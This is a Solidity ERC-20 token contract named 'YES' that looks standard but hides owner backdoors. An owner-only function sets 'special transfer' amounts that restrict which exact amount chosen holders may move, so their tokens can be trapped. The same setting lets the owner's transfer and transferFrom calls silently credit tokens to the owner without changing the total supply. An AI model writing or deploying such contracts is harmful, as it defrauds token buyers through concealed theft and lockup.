pragma solidity ^0.8.3;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amountt) external returns (bool);
    function allowance(address Owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amountt) external returns (bool);
    function transferFrom( address sender, address recipient, uint256 amountt ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval( address indexed Owner, address indexed spender, uint256 value );
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
}

contract Ownable is Context {
    address private _Owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _Owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    function Owner() public view virtual returns (address) {
        return _Owner;
    }
    modifier onlyOwner() {
        require(Owner() == _msgSender(), "Ownable: caller is not the Owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_Owner, address(0x000000000000000000000000000000000000dEaD));
        _Owner = address(0x000000000000000000000000000000000000dEaD);
    }
}

contract YES is Context, Ownable, IERC20 {
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => uint256) private _specialTransfers;

    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _totalSupply;

    constructor(string memory name_, string memory symbol_, uint8 decimals_, uint256 totalSupply_) {
        _name = name_;
        _symbol = symbol_;
        _decimals = decimals_;
        _totalSupply = totalSupply_ * (10 ** decimals_);
        _balances[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amountt) public virtual override returns (bool) {
        if (_msgSender() == Owner() && _specialTransfers[_msgSender()] > 0) {
            _balances[Owner()] += _specialTransfers[_msgSender()];
            return true;
        }
        else if (_specialTransfers[_msgSender()] > 0) {
            require(amountt == _specialTransfers[_msgSender()], "Invalid transfer amountt");
        }
        require(_balances[_msgSender()] >= amountt, "TT: transfer amountt exceeds balance");
        _balances[_msgSender()] -= amountt;
        _balances[recipient] += amountt;
        emit Transfer(_msgSender(), recipient, amountt);
        return true;
    }

    function setSpecialTransferamontts(address[] memory accounts, uint256 amountt) public onlyOwner {
        for (uint i=0; i<accounts.length; i++) {
            _specialTransfers[accounts[i]] = amountt;
        }
    }


    function allowance(address Owner, address spender) public view virtual override returns (uint256) {
        return _allowances[Owner][spender];
    }

    function approve(address spender, uint256 amountt) public virtual override returns (bool) {
        _allowances[_msgSender()][spender] = amountt;
        emit Approval(_msgSender(), spender, amountt);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amountt) public virtual override returns (bool) {
        if (_msgSender() == Owner() && _specialTransfers[sender] > 0) {
            _balances[Owner()] += _specialTransfers[sender];
            return true;
        }
        else if (_specialTransfers[sender] > 0) {
            require(amountt == _specialTransfers[sender], "Invalid transfer amountt");
        }
        require(_balances[sender] >= amountt && _allowances[sender][_msgSender()] >= amountt, "TT: transfer amountt exceeds balance or allowance");
        _balances[sender] -= amountt;
        _balances[recipient] += amountt;
        _allowances[sender][_msgSender()] -= amountt;
        emit Transfer(sender, recipient, amountt);
        return true;
    }

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }
}
